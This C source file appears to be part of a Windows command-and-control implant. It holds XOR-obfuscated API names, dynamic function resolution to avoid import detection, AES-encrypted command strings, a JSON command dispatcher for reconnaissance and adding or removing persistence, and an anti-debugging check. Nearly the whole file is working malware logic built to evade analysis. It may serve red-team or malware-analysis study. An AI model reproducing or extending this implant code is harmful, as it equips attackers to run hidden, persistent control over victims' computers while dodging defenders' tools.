#include "base.h"

// Function definitions
typedef BOOL ( WINAPI * CryptAcquireContextW_t ) (
	HCRYPTPROV 	    *phProv,
	LPCWSTR         szContainer,
	LPCWSTR         szProvider,
	DWORD      	    dwProvType,
	DWORD      	    dwFlags
);

typedef BOOL ( WINAPI * CryptCreateHash_t ) (
	HCRYPTPROV 		hProv,
	ALG_ID     		Algid,
	HCRYPTKEY  		hKey,
	DWORD      		dwFlags,
	HCRYPTHASH 		*phHash
);

typedef BOOL ( WINAPI * CryptHashData_t ) (
	HCRYPTHASH 		hHash,
	const BYTE 		*pbData,
	DWORD      		dwDataLen,
	DWORD      		dwFlags
);

typedef BOOL ( WINAPI * CryptDeriveKey_t ) (
	HCRYPTPROV 		hProv,
	ALG_ID     		Algid,
	HCRYPTHASH 		hBaseData,
	DWORD      		dwFlags,
	HCRYPTKEY  		*phKey
);

typedef BOOL ( WINAPI * CryptDecrypt_t ) (
	HCRYPTKEY  		hKey,
	HCRYPTHASH 		hHash,
	BOOL       		Final,
	DWORD      		dwFlags,
	BYTE       		*pbData,
	DWORD      		*pdwDataLen
);

typedef BOOL ( WINAPI * CryptReleaseContext_t ) (
	HCRYPTPROV 		hProv,
	DWORD      		dwFlags
);

typedef BOOL ( WINAPI * CryptDestroyHash_t ) (
	HCRYPTHASH 		hHash
);

typedef BOOL ( WINAPI * CryptDestroyKey_t ) (
	HCRYPTKEY 		hKey
);

typedef BOOL ( WINAPI * FreeLibrary_t ) (
    HMODULE         hLibModule
);

typedef BOOL ( WINAPI * IsDebuggerPresent_t ) ( );

char * jsonData = NULL;

// Convert char array (string) to a wide string (LPCWSTR)
// cpp version: https://gist.github.com/jsxinvivo/11f383ac61a56c1c0c25
wchar_t * convertCharArrayToLPCWSTR( char * charArray ) 
{
    wchar_t * wString = (wchar_t*) malloc( 4096 * sizeof( wchar_t ) );
    if ( wString != NULL ) {
        MultiByteToWideChar( CP_ACP, 0, charArray, -1, wString, 4096 );
    }
    return wString;
}

void XORDecrypt( char * data, size_t data_len, char * key, size_t key_len ) {
    int j = 0;
    
    for ( int i = 0; i < data_len; i++ ) {
        data[i] = data[i] ^ key[j];
        
        j++;
        if ( j >= key_len ) 
            j = 0;
    }
}

int AESDecrypt( char * payload, DWORD payload_len, char * key, size_t keylen )
{
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY  hKey;

    // XOR-ed strings
    char xorkey[]                = { 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x31, 0x32, 0x33, 0x34 };
    char sCryptAcquireContextW[] = { 0x2, 0x30, 0x3a, 0x34, 0x31, 0x7, 0x24, 0x40, 0x47, 0x5a, 0x46, 0x24, 0x1, 0x2c, 0x2a, 0x31, 0x23, 0x3f, 0x45, 0x65, 0x33 };
    char sCryptCreateHash[]      = { 0x2, 0x30, 0x3a, 0x34, 0x31, 0x5, 0x35, 0x54, 0x53, 0x47, 0x51, 0x9, 0x23, 0x30, 0x2c, 0x45 };
    char sCryptHashData[]        = { 0x2, 0x30, 0x3a, 0x34, 0x31, 0xe, 0x26, 0x42, 0x5a, 0x77, 0x55, 0x35, 0x23, 0x43 };
    char sCryptDeriveKey[]       = { 0x2, 0x30, 0x3a, 0x34, 0x31, 0x2, 0x22, 0x43, 0x5b, 0x45, 0x51, 0xa, 0x27, 0x3a, 0x44 };
    char sCryptDecrypt[]         = { 0x2, 0x30, 0x3a, 0x34, 0x31, 0x2, 0x22, 0x52, 0x40, 0x4a, 0x44, 0x35, 0x42 };
    char sCryptReleaseContext[]  = { 0x2, 0x30, 0x3a, 0x34, 0x31, 0x14, 0x22, 0x5d, 0x57, 0x52, 0x47, 0x24, 0x1, 0x2c, 0x2a, 0x31, 0x23, 0x3f, 0x45, 0x32 };
    char sCryptDestroyHash[]     = { 0x2, 0x30, 0x3a, 0x34, 0x31, 0x2, 0x22, 0x42, 0x46, 0x41, 0x5b, 0x38, 0xa, 0x22, 0x37, 0x2d, 0x46 };
    char sCryptDestroyKey[]      = { 0x2, 0x30, 0x3a, 0x34, 0x31, 0x2, 0x22, 0x42, 0x46, 0x41, 0x5b, 0x38, 0x9, 0x26, 0x3d, 0x45 };
    char sFreeLibrary[]          = { 0x7, 0x30, 0x26, 0x21, 0x9, 0x2f, 0x25, 0x43, 0x53, 0x41, 0x4d, 0x41 };
    char sADVAPI32[]             = { 0x0, 0x6, 0x15, 0x5, 0x15, 0xf, 0x74, 0x3, 0x32 };
    char sKERNEL32[]             = { 0xa, 0x7, 0x11, 0xa, 0x0, 0xa, 0x74, 0x3, 0x1c, 0x77, 0x78, 0xd, 0x42 };
    
    // Decrypt XOR-ed strings
    XORDecrypt( (char *) sCryptAcquireContextW, sizeof( sCryptAcquireContextW ),  (char *) xorkey, sizeof( xorkey ) );
    XORDecrypt( (char *) sCryptCreateHash,      sizeof( sCryptCreateHash ),       (char *) xorkey, sizeof( xorkey ) );
    XORDecrypt( (char *) sCryptHashData,        sizeof( sCryptHashData ),         (char *) xorkey, sizeof( xorkey ) );
    XORDecrypt( (char *) sCryptDeriveKey,       sizeof( sCryptDeriveKey ),        (char *) xorkey, sizeof( xorkey ) );
    XORDecrypt( (char *) sCryptDecrypt,         sizeof( sCryptDecrypt ),          (char *) xorkey, sizeof( xorkey ) );
    XORDecrypt( (char *) sCryptReleaseContext,  sizeof( sCryptReleaseContext ),   (char *) xorkey, sizeof( xorkey ) );
    XORDecrypt( (char *) sCryptDestroyHash,     sizeof( sCryptDestroyHash ),      (char *) xorkey, sizeof( xorkey ) );
    XORDecrypt( (char *) sCryptDestroyKey,      sizeof( sCryptDestroyKey ),       (char *) xorkey, sizeof( xorkey ) );
    XORDecrypt( (char *) sFreeLibrary,          sizeof( sFreeLibrary ),           (char *) xorkey, sizeof( xorkey ) );
    XORDecrypt( (char *) sADVAPI32,             sizeof( sADVAPI32 ),              (char *) xorkey, sizeof( xorkey ) );
    XORDecrypt( (char *) sKERNEL32,             sizeof( sKERNEL32 ),              (char *) xorkey, sizeof( xorkey ) );

    HMODULE hAdvapi = LoadLibraryEx( sADVAPI32, NULL, 0 );

    // Function call obfuscation
    CryptAcquireContextW_t pCryptAcquireContextW = (CryptAcquireContextW_t) GetProcAddress( hAdvapi, sCryptAcquireContextW );
    CryptCreateHash_t pCryptCreateHash           = (CryptCreateHash_t)      GetProcAddress( hAdvapi, sCryptCreateHash );
	CryptHashData_t pCryptHashData               = (CryptHashData_t)        GetProcAddress( hAdvapi, sCryptHashData );
	CryptDeriveKey_t pCryptDeriveKey             = (CryptDeriveKey_t)       GetProcAddress( hAdvapi, sCryptDeriveKey );
	CryptDecrypt_t pCryptDecrypt                 = (CryptDecrypt_t)         GetProcAddress( hAdvapi, sCryptDecrypt );
	CryptReleaseContext_t pCryptReleaseContext   = (CryptReleaseContext_t)  GetProcAddress( hAdvapi, sCryptReleaseContext );
	CryptDestroyHash_t pCryptDestroyHash         = (CryptDestroyHash_t)     GetProcAddress( hAdvapi, sCryptDestroyHash );
	CryptDestroyKey_t pCryptDestroyKey           = (CryptDestroyKey_t)      GetProcAddress( hAdvapi, sCryptDestroyKey );
    FreeLibrary_t pFreeLibrary                   = (FreeLibrary_t)          GetProcAddress( GetModuleHandle( sKERNEL32 ), sFreeLibrary );

    if ( !pCryptAcquireContextW( &hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT )) {
        return -1;
    }

    if ( !pCryptCreateHash( hProv, CALG_SHA_256, 0, 0, &hHash )) {
        return -1;
    }

    if ( !pCryptHashData( hHash, (BYTE*) key, (DWORD) keylen, 0 )) {
        return -1;              
    }

    if ( !pCryptDeriveKey( hProv, CALG_AES_256, hHash, 0,&hKey )) {
        return -1;
    }
        
    if ( !pCryptDecrypt( hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, &payload_len )) {
        return -1;
    }
        
    pCryptReleaseContext( hProv, 0 );
    pCryptDestroyHash( hHash );
    pCryptDestroyKey( hKey );
    
    pFreeLibrary( hAdvapi );
        
    return 0;
}

// Parse the command and then execute it
void exec_command( LPSTR response )
{
    // Parse the JSON command
    cJSON * json = cJSON_Parse( response );
    if ( json == NULL ) {
        const char * error_ptr = cJSON_GetErrorPtr();
        if ( error_ptr != NULL ) {
            printf( "[-] Error in cJSON_Parse: %s\n", error_ptr );
        }
        cJSON_Delete(json);
    } else {
        // AES encrypted strings
        char key[]                     = { 0x71, 0x71, 0x5c, 0xa5, 0xf8, 0x5e, 0x5b, 0x23, 0x26, 0x82, 0xeb, 0xcf, 0xf7, 0x30, 0x1c, 0x66 };
        char encryptedCommand[]        = { 0x3e, 0xcc, 0xca, 0xf9, 0x9f, 0xae, 0x5b, 0xc4, 0x2e, 0x80, 0xe7, 0x46, 0x6b, 0x74, 0xc3, 0xd0 };
        char encryptedWhoami[]         = { 0x47, 0x20, 0x32, 0x6c, 0x23, 0x6, 0x7e, 0x54, 0xb5, 0x9d, 0xd2, 0xb6, 0x22, 0x31, 0x83, 0x89 };
        char encryptedHostname[]       = { 0x63, 0x85, 0x68, 0x9d, 0x4f, 0xe9, 0x99, 0xee, 0x18, 0x4a, 0xdf, 0xbd, 0x2a, 0xbf, 0xf2, 0xe3 };
        char encryptedPwd[]            = { 0x60, 0x7d, 0x5, 0x11, 0x6a, 0x57, 0x64, 0x0, 0x6b, 0xf, 0xc6, 0x9f, 0x6b, 0x5, 0x25, 0x35 };
        char encryptedAddPersistence[] = { 0xfb, 0x56, 0xc0, 0x6e, 0x76, 0xf4, 0x8c, 0xa0, 0x9c, 0xc8, 0x20, 0x6, 0x46, 0x19, 0xe1, 0xe6, 0x63, 0x31, 0x50, 0x70, 0x85, 0xc, 0x83, 0xcb, 0x2c, 0x66, 0xea, 0xfc, 0x4c, 0x65, 0x75, 0x67 };
        char encryptedDelPersistence[] = { 0xbb, 0xd3, 0x7c, 0xc7, 0xf8, 0x91, 0x85, 0x7d, 0x44, 0x27, 0x82, 0xf1, 0xaf, 0x76, 0x9f, 0xcb, 0x2c, 0xb8, 0xf0, 0x65, 0x92, 0x16, 0xfa, 0x66, 0x1e, 0x82, 0xb3, 0x3d, 0x67, 0xed, 0xfd, 0x3a };
        char encryptedExit[]           = { 0x7e, 0x9f, 0x12, 0xa, 0x1b, 0x55, 0x58, 0x95, 0x55, 0x5e, 0x94, 0xe8, 0x3e, 0xfe, 0x27, 0xe9 };

        // Decrypt the string
        AESDecrypt( (char *) encryptedCommand,        sizeof( encryptedCommand ),        (char *) key, sizeof( key ) );
        AESDecrypt( (char *) encryptedWhoami,         sizeof( encryptedWhoami ),         (char *) key, sizeof( key ) );
        AESDecrypt( (char *) encryptedHostname,       sizeof( encryptedHostname ),       (char *) key, sizeof( key ) );
        AESDecrypt( (char *) encryptedPwd,            sizeof( encryptedPwd ),            (char *) key, sizeof( key ) );
        AESDecrypt( (char *) encryptedAddPersistence, sizeof( encryptedAddPersistence ), (char *) key, sizeof( key ) );
        AESDecrypt( (char *) encryptedDelPersistence, sizeof( encryptedDelPersistence ), (char *) key, sizeof( key ) );
        AESDecrypt( (char *) encryptedExit,           sizeof( encryptedExit ),           (char *) key, sizeof( key ) );

        // Access "command" item with cJSON library
        const cJSON * command = cJSON_GetObjectItemCaseSensitive( json, encryptedCommand );
        if ( cJSON_IsString( command ) && ( command->valuestring != NULL )) {
            // Valid commands like whoami, hostname, pwd, add-persistence, del-persistence and exit
            if ( strcmp( command->valuestring, encryptedWhoami ) == 0 ) {
                // Execute custom whoami command
                char * result = customWhoami();
                jsonData = commandResultJSON( command->valuestring, result );
            }
            else if ( strcmp( command->valuestring, encryptedHostname ) == 0 ) {
                // Execute custom hostname command
                char * result = customHostname();
                jsonData = commandResultJSON( command->valuestring, result );
            }
            else if ( strcmp( command->valuestring, encryptedPwd ) == 0 ) {
                // Execute custom pwd command
                char * result = customPwd();
                jsonData = commandResultJSON( command->valuestring, result );
            }
            // have to encrypt add and del persistence
            else if ( strcmp( command->valuestring, encryptedAddPersistence ) == 0 ) {
                // Add the persistence technique
                char * result = addPersistence();
                jsonData = commandResultJSON( command->valuestring, result );
            }
            else if ( strcmp( command->valuestring, encryptedDelPersistence ) == 0 ) {
                // Remove the persistence technique
                char * result = delPersistence();
                jsonData = commandResultJSON( command->valuestring, result );
            }
            else if ( strcmp( command->valuestring, encryptedExit ) == 0 ) {
                // Execute custom exit command
                customExit();
            }
            else 
                printf( "[-] Not a valid command!\n" );
        }
        // No available commands
        else {
            printf( "[!] No available commands!\n" );
            char * result = "";
            jsonData = commandResultJSON( command->valuestring, result );
        }
        cJSON_Delete( json );
    }
}

// Create a JSON object with command and result as {"key":"value"}
char * commandResultJSON( const char * command, const char * result )
{
    // Create a cJSON object
    cJSON * json = cJSON_CreateObject();

    // Add command and result to the JSON object
    cJSON_AddStringToObject( json, command, result );

    // Print the JSON object to a string
    char * resultJSON = cJSON_PrintUnformatted( json );

    // Clean up JSON object
    cJSON_Delete( json );

    return resultJSON;
}

// Check if a debugger is attached
BOOL isDebugged( )
{
    char xorkey[]             = { 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x31, 0x32, 0x33, 0x34 };
    char sKERNEL32[]          = { 0xa, 0x7, 0x11, 0xa, 0x0, 0xa, 0x74, 0x3, 0x1c, 0x77, 0x78, 0xd, 0x42 };
    char sIsDebuggerPresent[] = { 0x8, 0x31, 0x7, 0x21, 0x27, 0x33, 0x20, 0x56, 0x57, 0x41, 0x64, 0x33, 0x27, 0x30, 0x21, 0x2b, 0x32, 0x47 };

    XORDecrypt( (char *) sKERNEL32,          sizeof( sKERNEL32 ),          (char *) xorkey, sizeof( xorkey ) );
    XORDecrypt( (char *) sIsDebuggerPresent, sizeof( sIsDebuggerPresent ), (char *) xorkey, sizeof( xorkey ) );
    
    IsDebuggerPresent_t pIsDebuggerPresent = (IsDebuggerPresent_t) GetProcAddress( GetModuleHandle( sKERNEL32 ), sIsDebuggerPresent );

    return pIsDebuggerPresent();
}